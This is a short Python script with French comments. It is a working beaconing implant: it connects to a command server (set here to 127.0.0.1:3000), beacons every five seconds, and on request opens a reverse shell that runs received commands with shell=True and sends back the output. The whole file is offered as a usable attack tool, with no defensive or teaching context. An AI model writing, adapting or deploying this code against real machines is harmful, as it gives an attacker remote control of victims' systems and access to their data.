import socket
import subprocess
import time

SERVER_IP = "127.0.0.1"  # Adresse IP du serveur
SERVER_PORT = 3000           # Port du serveur
BUFFER_SIZE = 1024           # Taille du tampon

def reverse_shell(server_sock):
    while True:
        # Recevoir la commande du serveur
        command = server_sock.recv(BUFFER_SIZE).decode('utf-8').strip()

        if command == "exit":
            server_sock.close()
            break

        try:
            # Exécuter la commande
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                server_sock.send("Erreur lors de l'exécution\n".encode('utf-8'))
            else:
                # Envoyer le résultat de la commande
                server_sock.send(result.stdout.encode('utf-8'))
            server_sock.send(b"DONE")  # Marqueur de fin
        except Exception as e:
            server_sock.send(f"Erreur lors de l'exécution: {str(e)}\n".encode('utf-8'))

def beacon(server_sock):
    while True:
        # Envoyer un beacon
        server_sock.send(b"BEACON")

        # Attendre les instructions du serveur
        task = server_sock.recv(BUFFER_SIZE).decode('utf-8').strip()

        if task == "reverse_shell":
            reverse_shell(server_sock)

        time.sleep(5)  # Pause avant le prochain beacon

def main():
    # Créer une socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Connexion au serveur
        server_sock.connect((SERVER_IP, SERVER_PORT))
    except socket.error as e:
        print(f"Erreur de connexion: {e}")
        return

    # Lancer le beacon
    beacon(server_sock)

    server_sock.close()

if __name__ == "__main__":
    main()
